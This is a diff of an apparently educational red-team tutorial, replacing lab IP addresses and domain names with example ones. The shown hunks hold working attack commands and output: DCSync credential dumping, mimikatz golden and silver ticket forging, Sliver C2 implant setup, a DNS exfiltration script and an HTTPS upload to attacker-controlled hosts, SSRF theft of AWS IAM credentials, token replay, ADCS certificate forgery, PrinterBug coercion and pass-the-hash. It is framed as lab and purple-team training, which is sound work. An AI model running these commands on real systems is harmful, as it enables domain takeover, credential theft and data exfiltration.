@@ -502,16 +502,16 @@ domain after obtaining Domain Admin credentials.
 ```bash
 # secretsdump.py DCSync — replicates all domain credentials without touching LSASS memory
 
-python3 secretsdump.py CORP/Administrator:'P@ssw0rd'@192.168.10.10 -just-dc
+python3 secretsdump.py CORP/Administrator:'P@ssw0rd'@192.0.2.10 -just-dc
 # => [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-# => CORP.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9dc5a...
-# => CORP.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3b4de47e5e4f7...
+# => CORP.EXAMPLE/Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9dc5a...
+# => CORP.EXAMPLE/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3b4de47e5e4f7...
 # =>   krbtgt hash is the golden ticket key — CRITICAL asset
-# => CORP.LOCAL/svc_sql:1108:aad3b435b51404eeaad3b435b51404ee:9af4b3c2d1e0...
-# => CORP.LOCAL/jsmith:1109:aad3b435b51404eeaad3b435b51404ee:8c3e71fb2a9d...
+# => CORP.EXAMPLE/svc_sql:1108:aad3b435b51404eeaad3b435b51404ee:9af4b3c2d1e0...
+# => CORP.EXAMPLE/jsmith:1109:aad3b435b51404eeaad3b435b51404ee:8c3e71fb2a9d...
 # => [*] Kerberos keys grabbed
-# => CORP.LOCAL/Administrator:aes256-cts-hmac-sha1-96:7e8a3b...
-# => CORP.LOCAL/krbtgt:aes256-cts-hmac-sha1-96:f1e2d3...
+# => CORP.EXAMPLE/Administrator:aes256-cts-hmac-sha1-96:7e8a3b...
+# => CORP.EXAMPLE/krbtgt:aes256-cts-hmac-sha1-96:f1e2d3...
 
 # DCSync generates specific Windows Security event 4662 on the DC:
 # => Object: CN=domain,DC=CORP,DC=LOCAL
@@ -551,7 +551,7 @@ mimikatz # kerberos::purge
 # => Ticket(s) purge for current session is OK
 # => clear existing tickets so forged ticket is used cleanly
 
-mimikatz # kerberos::golden /user:FakeAdmin /domain:CORP.LOCAL \
+mimikatz # kerberos::golden /user:FakeAdmin /domain:CORP.EXAMPLE \
   /sid:S-1-5-21-1234567890-987654321-111111111 \
   /krbtgt:3b4de47e5e4f7a8b2c3d4e5f6a7b8c9d \
   /id:500 /groups:512,519,544,555,513 /endin:87600 /renewmax:262800
@@ -569,8 +569,8 @@ mimikatz # kerberos::ptt ticket.kirbi
 # => forged TGT is now injected into current logon session's ticket cache
 
 klist
-# => #0> Client: FakeAdmin @ CORP.LOCAL
-# =>     Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
+# => #0> Client: FakeAdmin @ CORP.EXAMPLE
+# =>     Server: krbtgt/CORP.EXAMPLE @ CORP.EXAMPLE
 # =>     End Time: 5/21/2036  — 10-year validity
 
 dir \\DC01\C$
@@ -609,15 +609,15 @@ domain after compromising the `svc_sql` service account hash.
 # Obtain service account hash first (from secretsdump or LSASS dump)
 # svc_sql NT hash: 9af4b3c2d1e0f5a6b7c8d9e0f1a2b3c4
 
-mimikatz # kerberos::golden /user:Administrator /domain:CORP.LOCAL \
+mimikatz # kerberos::golden /user:Administrator /domain:CORP.EXAMPLE \
   /sid:S-1-5-21-1234567890-987654321-111111111 \
-  /target:SQLSRV01.CORP.LOCAL \
+  /target:SQLSRV01.CORP.EXAMPLE \
   /service:MSSQLSvc \
   /rc4:9af4b3c2d1e0f5a6b7c8d9e0f1a2b3c4 \
   /id:500 /groups:512,519,544 \
   /ticket:silver_mssql.kirbi
 # => /target:SQLSRV01  — the specific host running the service
-# => /service:MSSQLSvc — SPN prefix; ticket valid for MSSQLSvc/SQLSRV01.CORP.LOCAL
+# => /service:MSSQLSvc — SPN prefix; ticket valid for MSSQLSvc/SQLSRV01.CORP.EXAMPLE
 # => /rc4              — svc_sql NT hash (service account secret, NOT krbtgt)
 # => generates silver_mssql.kirbi — forged ST, signed by service account's key
 
@@ -626,7 +626,7 @@ mimikatz # kerberos::ptt silver_mssql.kirbi
 # => ST injected into session — SQLSRV01 will accept it without contacting DC
 
 # Connect to SQL with the injected silver ticket
-sqlcmd -S SQLSRV01.CORP.LOCAL -Q "SELECT SYSTEM_USER"
+sqlcmd -S SQLSRV01.CORP.EXAMPLE -Q "SELECT SYSTEM_USER"
 # => SYSTEM_USER
 # => Administrator        — SQL Server sees a valid ticket for domain Administrator
 # => --------------------------------
@@ -749,7 +749,7 @@ mimikatz # sekurlsa::logonpasswords
 # => Domain            : CORP
 # => Logon Server      : DC01
 # =>  * Username : jsmith
-# =>  * Domain   : CORP.LOCAL
+# =>  * Domain   : CORP.EXAMPLE
 # =>  * NTLM     : 8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e  ← usable for PtH
 # =>  * SHA1     : 4f5e6a7b8c9d0e1f2a3b4c5d6e7f8a9b
 ```
@@ -838,7 +838,7 @@ Linux, and macOS with built-in mTLS, DNS, and HTTP transport options.
 Windows 10 target back to a Kali Linux attacker VM on the same isolated network.
 
 ```bash
-# Sliver C2 — server setup on Kali (attacker VM at 192.168.10.5)
+# Sliver C2 — server setup on Kali (attacker VM at 192.0.2.5)
 
 sliver-server
 # => [*] Starting gRPC server ...
@@ -854,7 +854,7 @@ sliver-server
 # => mTLS uses mutual TLS — both sides present certificates; traffic is opaque to proxies
 
 # Step 2: Generate an implant (agent) for Windows x64
-[server] sliver > generate --mtls 192.168.10.5:8443 --os windows --arch amd64 \
+[server] sliver > generate --mtls 192.0.2.5:8443 --os windows --arch amd64 \
   --format exe --save /tmp/beacon.exe
 # => [*] Generating new windows/amd64 implant binary
 # => [*] Symbol obfuscation is enabled
@@ -868,7 +868,7 @@ sliver-server
 # Step 4: Implant checks in to C2 server
 [server] sliver > sessions
 # => ID         Transport  Remote Address       Hostname   Username    OS/Arch
-# => 4a3f2e1d   mtls       192.168.10.20:51234  WIN10-LAB  jsmith      windows/amd64
+# => 4a3f2e1d   mtls       192.0.2.20:51234  WIN10-LAB  jsmith      windows/amd64
 # => new session established; all traffic is mTLS-encrypted, no plaintext
 
 [server] sliver > use 4a3f2e1d
@@ -904,13 +904,13 @@ environment where all outbound traffic except DNS is blocked by firewall policy.
 ```python
 #!/usr/bin/env python3
 # dns_exfil.py — encode and exfiltrate data via DNS TXT queries (attacker-controlled domain)
-# Requires: attacker controls NS for exfil.attacker-lab.internal
+# Requires: attacker controls NS for exfil.attacker-lab.example
 
 import base64
 import socket
 import time
 
-ATTACKER_DOMAIN = "exfil.attacker-lab.internal"  # => attacker-controlled DNS zone
+ATTACKER_DOMAIN = "exfil.attacker-lab.example"  # => attacker-controlled DNS zone
 CHUNK_SIZE = 30   # => DNS label max 63 chars; base32 of 30 bytes = 48 chars (safe)
 
 def exfil_data(data: bytes) -> None:
@@ -925,7 +925,7 @@ def exfil_data(data: bytes) -> None:
     for seq, chunk in enumerate(chunks):
         # Step 2: construct query — <seq>.<chunk>.<total>.<domain>
         query = f"{seq}.{chunk}.{total}.{ATTACKER_DOMAIN}"
-        # => e.g., 0.on2he2lbon2he2lb.2.exfil.attacker-lab.internal
+        # => e.g., 0.on2he2lbon2he2lb.2.exfil.attacker-lab.example
         # => DNS resolver forwards query to attacker's NS; attacker logs label content
 
         try:
@@ -1012,7 +1012,7 @@ implant-config:
 
 ```bash
 # Verify TLS fingerprint blending (JA3 hash should match Chrome)
-curl -v --tlsv1.3 https://c2.attacker-lab.internal/analytics.js 2>&1 | grep 'TLS'
+curl -v --tlsv1.3 https://c2.attacker-lab.example/analytics.js 2>&1 | grep 'TLS'
 # => * TLSv1.3 (OUT), TLS handshake, Client hello (1):
 # JA3 fingerprint controlled by implant's TLS library configuration
 # => targeting ja3: "771,4865-4866-4867-...,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,..."
@@ -1273,7 +1273,7 @@ New-Item -ItemType Directory -Path $stagePath -Force | Out-Null
 # =>   Compressed: 24,891,334     — ~24 MB after (87% reduction)
 
 # Step 4: Exfiltrate via HTTPS to attacker web server (blends with normal HTTPS traffic)
-$uploadUri = "https://file-share.attacker-lab.internal/upload/$(New-Guid)"
+$uploadUri = "https://file-share.attacker-lab.example/upload/$(New-Guid)"
 # => unique GUID in URI — makes each exfil URL different to defeat exact-match rules
 
 Invoke-WebRequest -Uri $uploadUri `
@@ -1387,7 +1387,7 @@ a lab AWS EC2 instance running a URL-fetching web service.
 # Normal usage: user supplies a URL; server fetches and returns the response
 
 # Step 1: Confirm basic SSRF by fetching an internal resource
-curl -s -X POST https://webapp.lab.internal/fetch \
+curl -s -X POST https://webapp.lab.example/fetch \
   -H "Content-Type: application/json" \
   -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
 # => ami-id
@@ -1397,13 +1397,13 @@ curl -s -X POST https://webapp.lab.internal/fetch \
 # => local-hostname
 
 # Step 2: Pivot SSRF to extract IAM role name
-curl -s -X POST https://webapp.lab.internal/fetch \
+curl -s -X POST https://webapp.lab.example/fetch \
   -H "Content-Type: application/json" \
   -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
 # => WebApp-EC2-Role        ← role name returned through the SSRF
 
 # Step 3: Extract temporary IAM credentials via SSRF
-curl -s -X POST https://webapp.lab.internal/fetch \
+curl -s -X POST https://webapp.lab.example/fetch \
   -H "Content-Type: application/json" \
   -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/WebApp-EC2-Role"}'
 # => {"Code":"Success","Type":"AWS-HMAC",
@@ -1457,7 +1457,7 @@ environment with a misconfigured authorization server that logs full tokens in a
 # => this is a known OAuth anti-pattern; tokens must be in Authorization header only
 
 grep "access_token=" /var/log/nginx/access.log | tail -1
-# => 192.168.10.50 - - [21/May/2026:10:30:01] "GET /api/data?access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInNjb3BlIjoiZmluYW5jZTpyZWFkIGFkbWluOndyaXRlIiwiZXhwIjoxNzE2MzQ4NjAwfQ.SIG HTTP/1.1" 200
+# => 192.0.2.50 - - [21/May/2026:10:30:01] "GET /api/data?access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInNjb3BlIjoiZmluYW5jZTpyZWFkIGFkbWluOndyaXRlIiwiZXhwIjoxNzE2MzQ4NjAwfQ.SIG HTTP/1.1" 200
 # => token extracted from log: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
 
 TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInNjb3BlIjoiZmluYW5jZTpyZWFkIGFkbWluOndyaXRlIiwiZXhwIjoxNzE2MzQ4NjAwfQ.SIG"
@@ -1473,9 +1473,9 @@ echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
 
 # Step 3: Replay the stolen token from attacker machine (different IP)
 curl -s -H "Authorization: Bearer $TOKEN" \
-  https://api.lab.internal/v1/admin/users
-# => [{"id":"user_001","email":"ceo@corp.local","role":"admin"},
-# =>   {"id":"user_002","email":"cfo@corp.local","role":"admin"}, ...]
+  https://api.lab.example/v1/admin/users
+# => [{"id":"user_001","email":"ceo@corp.example","role":"admin"},
+# =>   {"id":"user_002","email":"cfo@corp.example","role":"admin"}, ...]
 # => token accepted — no IP binding, no reuse detection; full admin API access
 ```
 
@@ -1509,7 +1509,7 @@ AD environment with a vulnerable certificate template.
 # ESC1 exploitation — requesting a Domain Admin certificate as a standard user
 
 # Step 1: Enumerate certificate templates for ESC1 vulnerabilities
-certipy find -u jsmith@CORP.LOCAL -p 'Summer2024!' -dc-ip 192.168.10.10
+certipy find -u jsmith@CORP.EXAMPLE -p 'Summer2024!' -dc-ip 192.0.2.10
 # => [*] Finding certificate templates
 # => [*] Found 23 certificate templates
 # => [!] Vulnerable certificate templates
@@ -1521,19 +1521,19 @@ certipy find -u jsmith@CORP.LOCAL -p 'Summer2024!' -dc-ip 192.168.10.10
 # =>   Permissions > Enrollment Rights: Domain Users ← any user can request
 
 # Step 2: Request a certificate with Domain Admin UPN in the SAN
-certipy req -u jsmith@CORP.LOCAL -p 'Summer2024!' \
-  -ca CORP-CA -target ca.CORP.LOCAL \
+certipy req -u jsmith@CORP.EXAMPLE -p 'Summer2024!' \
+  -ca CORP-CA -target ca.CORP.EXAMPLE \
   -template UserAuthentication \
-  -upn Administrator@CORP.LOCAL
-# => -upn Administrator@CORP.LOCAL — forged UPN in SAN; no admin creds required
+  -upn Administrator@CORP.EXAMPLE
+# => -upn Administrator@CORP.EXAMPLE — forged UPN in SAN; no admin creds required
 # => [*] Requesting certificate via RPC
 # => [*] Successfully requested certificate
-# => [*] Certificate UPN: Administrator@CORP.LOCAL
+# => [*] Certificate UPN: Administrator@CORP.EXAMPLE
 # => [*] Saved certificate to administrator.pfx
 
 # Step 3: Use the forged certificate to obtain a Kerberos TGT as Domain Admin
-certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
-# => [*] Using principal: Administrator@CORP.LOCAL
+certipy auth -pfx administrator.pfx -dc-ip 192.0.2.10
+# => [*] Using principal: Administrator@CORP.EXAMPLE
 # => [*] Trying to get TGT...
 # => [*] Got TGT
 # => [*] Saved credential cache to administrator.ccache
@@ -1574,11 +1574,11 @@ delegation flag set.
 # Unconstrained delegation exploitation — coerce DC auth, steal machine TGT
 
 # Step 1: Identify hosts with unconstrained delegation enabled
-python3 bloodhound.py -u jsmith -p 'Summer2024!' -d CORP.LOCAL -dc 192.168.10.10
+python3 bloodhound.py -u jsmith -p 'Summer2024!' -d CORP.EXAMPLE -dc 192.0.2.10
 # => collects AD data including delegation settings
 
 # Or use ldapsearch directly:
-ldapsearch -H ldap://192.168.10.10 -x -D "jsmith@CORP.LOCAL" -w 'Summer2024!' \
+ldapsearch -H ldap://192.0.2.10 -x -D "jsmith@CORP.EXAMPLE" -w 'Summer2024!' \
   -b "DC=CORP,DC=LOCAL" \
   "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
   sAMAccountName userAccountControl
@@ -1594,14 +1594,14 @@ Rubeus.exe monitor /interval:5 /nowrap
 # => waiting for DC01$ to authenticate to APPSRV01...
 
 # Step 3: Coerce DC01 to authenticate to APPSRV01 using PrinterBug (MS-RPRN)
-python3 printerbug.py CORP/jsmith:'Summer2024!'@DC01.CORP.LOCAL APPSRV01.CORP.LOCAL
-# => [*] Triggering authentication from DC01.CORP.LOCAL to APPSRV01.CORP.LOCAL
-# => [*] Connecting to ncacn_np:DC01.CORP.LOCAL[\pipe\spoolss]
+python3 printerbug.py CORP/jsmith:'Summer2024!'@DC01.CORP.EXAMPLE APPSRV01.CORP.EXAMPLE
+# => [*] Triggering authentication from DC01.CORP.EXAMPLE to APPSRV01.CORP.EXAMPLE
+# => [*] Connecting to ncacn_np:DC01.CORP.EXAMPLE[\pipe\spoolss]
 # => [+] Triggered! — DC01 now authenticates to APPSRV01 via Kerberos
 
 # Step 4: Rubeus captures the DC01$ machine TGT
 # => [*] 5/21/2026 10:45:01 UTC - Found new TGT:
-# =>   User                  : DC01$@CORP.LOCAL
+# =>   User                  : DC01$@CORP.EXAMPLE
 # =>   StartTime             : 5/21/2026 10:45:00 UTC
 # =>   EndTime               : 5/21/2026 20:45:00 UTC
 # =>   Base64EncodedTicket   : doIFpDCCBaC...  ← DC01 machine TGT
@@ -1611,7 +1611,7 @@ Rubeus.exe ptt /ticket:doIFpDCCBaC...
 # => [+] Ticket successfully imported!
 
 # Now run DCSync using DC01's identity (another DC perspective)
-python3 secretsdump.py -k -no-pass DC01.CORP.LOCAL
+python3 secretsdump.py -k -no-pass DC01.CORP.EXAMPLE
 # => Domain credentials dumped as if we are DC01
 ```
 
@@ -1638,24 +1638,24 @@ references earlier examples and identifies the key detection opportunity defende
 at that stage.
 
 **Scenario:** Authorized red team engagement — a full simulated attack against an isolated
-lab corporate network (CORP.LOCAL, 192.168.10.0/24) with no prior knowledge.
+lab corporate network (CORP.EXAMPLE, 192.0.2.0/24) with no prior knowledge.
 
 ```bash
 # Phase 1: External Reconnaissance
 # ─────────────────────────────────
-subfinder -d corp-lab.internal -silent | httpx -silent -status-code
-# => corp-lab.internal        [200]    — main site
-# => mail.corp-lab.internal   [200]    — mail server
-# => vpn.corp-lab.internal    [200]    — VPN portal
-# => dev.corp-lab.internal    [200]    — development server (unexpected exposure)
+subfinder -d corp-lab.example -silent | httpx -silent -status-code
+# => corp-lab.example        [200]    — main site
+# => mail.corp-lab.example   [200]    — mail server
+# => vpn.corp-lab.example    [200]    — VPN portal
+# => dev.corp-lab.example    [200]    — development server (unexpected exposure)
 
 # Phase 2: Initial Access — Exploit dev server (CVE-2024-XXXX, authenticated RCE)
-curl -s -X POST http://dev.corp-lab.internal/api/build \
+curl -s -X POST http://dev.corp-lab.example/api/build \
   -d '{"template": "{{7*7}}"}' | grep -o "49"
 # => 49   — SSTI confirmed; dev server evaluates template expressions
 
 # Escalate SSTI to RCE → reverse shell (see Beginner examples for SSTI → shell chain)
-# => shell on dev.corp-lab.internal as www-data (web process user)
+# => shell on dev.corp-lab.example as www-data (web process user)
 
 # Phase 3: Local Privilege Escalation
 # ─────────────────────────────────────
@@ -1675,18 +1675,18 @@ grep -r "password\|passwd\|secret\|key" /var/www/ 2>/dev/null | grep -v ".git"
 # Phase 5: Pivot to Active Directory
 # ────────────────────────────────────
 # Test AD bind credentials discovered in config files
-python3 bloodhound.py -u binduser -p 'BindUser99!' -d CORP.LOCAL \
-  -dc 192.168.10.10 --collect All
+python3 bloodhound.py -u binduser -p 'BindUser99!' -d CORP.EXAMPLE \
+  -dc 192.0.2.10 --collect All
 # => bloodhound-python collects full AD graph for offline analysis
 # => ShortestPath to Domain Admin shows: binduser → APPSRV01$ (group member) → DA
 # => APPSRV01 has unconstrained delegation (Example 82 chain available)
 
 # Phase 6: Lateral Movement — Pass-the-Hash
 # ──────────────────────────────────────────
-python3 secretsdump.py 'CORP/binduser:BindUser99!'@192.168.10.10 -just-dc-user jsmith
+python3 secretsdump.py 'CORP/binduser:BindUser99!'@192.0.2.10 -just-dc-user jsmith
 # => jsmith NT hash: 8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e
 
-python3 psexec.py -hashes :8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e CORP/jsmith@192.168.10.20
+python3 psexec.py -hashes :8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e CORP/jsmith@192.0.2.20
 # => APPSRV01\> — interactive shell on APPSRV01 as jsmith (domain user + local admin)
 
 # Phase 7: Domain Admin via Unconstrained Delegation
@@ -1729,11 +1729,11 @@ Example 83, delivered to the lab's simulated CISO and security team.
 ```markdown
 <!-- Annotated red team report template — fill in per-engagement details -->
 
-# Red Team Engagement Report: CORP.LOCAL Lab — May 2026
+# Red Team Engagement Report: CORP.EXAMPLE Lab — May 2026
 
 ## Executive Summary
 
-**Engagement Scope**: External attack surface + internal network (192.168.10.0/24)
+**Engagement Scope**: External attack surface + internal network (192.0.2.0/24)
 **Authorization**: Written authorization from Lab Administrator (signed 2026-05-01)
 **Outcome**: Domain Admin achieved via 6-step attack chain; no zero-days used
 
@@ -1767,7 +1767,7 @@ Example 83, delivered to the lab's simulated CISO and security team.
 
 ---
 
-## Finding 1 — CRITICAL: SSTI Remote Code Execution on dev.corp-lab.internal
+## Finding 1 — CRITICAL: SSTI Remote Code Execution on dev.corp-lab.example
 
 **Risk Rating**: Critical (CVSS 9.8)
 **CWE**: CWE-94 (Improper Control of Code Generation)
@@ -1847,7 +1847,7 @@ ENGAGEMENT_TECHNIQUES = [
 
 # Build ATT&CK Navigator layer structure
 layer = {
-    "name": f"CORP.LOCAL Lab Engagement — {date.today()}",
+    "name": f"CORP.EXAMPLE Lab Engagement — {date.today()}",
     "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
     "domain": "enterprise-attack",
     "description": "Purple team debrief layer — red findings mapped to detection status",
